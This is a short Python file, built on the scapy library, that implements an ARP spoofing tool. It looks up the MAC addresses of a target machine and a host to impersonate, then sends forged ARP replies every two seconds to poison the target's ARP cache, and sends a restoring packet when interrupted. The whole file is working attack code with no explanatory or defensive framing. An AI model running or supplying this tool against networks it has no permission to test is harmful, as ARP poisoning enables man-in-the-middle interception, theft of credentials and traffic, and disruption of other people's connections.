import time
from scapy.all import ARP, Ether, srp, send


class ARPSpoof:
    def __init__(self, target_ip, spoof_ip):
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip

    def get_mac(self, ip):
        responses, unanswered = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, retry=10
        )
        for s, r in responses:
            return r[Ether].src
        return None

    def spoof(self):
        target_mac = self.get_mac(self.target_ip)
        if target_mac is None:
            print("Could not find MAC address for target. Exiting.")
            return

        spoof_mac = self.get_mac(self.spoof_ip)
        if spoof_mac is None:
            print("Could not find MAC address for spoof IP. Exiting.")
            return

        packet = ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.spoof_ip)

        print("Sending spoofed ARP replies...")

        try:
            while True:
                send(packet)
                time.sleep(2)
        except KeyboardInterrupt:
            print("\nARP spoofing stopped. Restoring network...")
            self.restore_network(self.target_ip, target_mac, self.spoof_ip, spoof_mac)

    def restore_network(self, target_ip, target_mac, host_ip, host_mac):
        packet = ARP(
            op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac
        )
        send(packet)
